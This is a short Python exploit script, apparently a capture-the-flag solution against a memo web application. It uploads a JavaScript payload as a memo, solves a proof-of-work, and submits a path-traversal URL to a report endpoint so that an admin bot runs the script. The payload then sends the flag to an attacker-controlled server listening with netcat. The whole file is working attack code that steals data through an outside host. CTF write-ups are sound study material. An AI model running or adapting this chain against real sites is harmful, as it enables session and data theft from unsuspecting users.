import requests
import random
import hashlib

HOST = 'http://192.168.47.128:8000' # change this
MYSERVER = 'http://0e1.kr:31337' # change this to your server, and listen a netcat

id = '%x'%random.getrandbits(64)
sess = requests.Session()

sess.post(HOST + '/memo/login', data={'id': id, 'pw': id})

pow = sess.get(HOST + '/pow').text

i = 0
while True:
	c = '%x'%i
	if hashlib.md5(pow + c).hexdigest().startswith('00000'):
		break
	i += 1

sess.post(HOST + '/memo/', data={
	'title': 'script.js',
	'content': open('README.js', 'rb').read().replace('http://server', MYSERVER)
	})

print sess.post(HOST + '/report', data={
	'url': HOST + '/memo/' + id + '//..%2F',
	'pow': c
	}).text

# at this point, your server will receive the flag as url query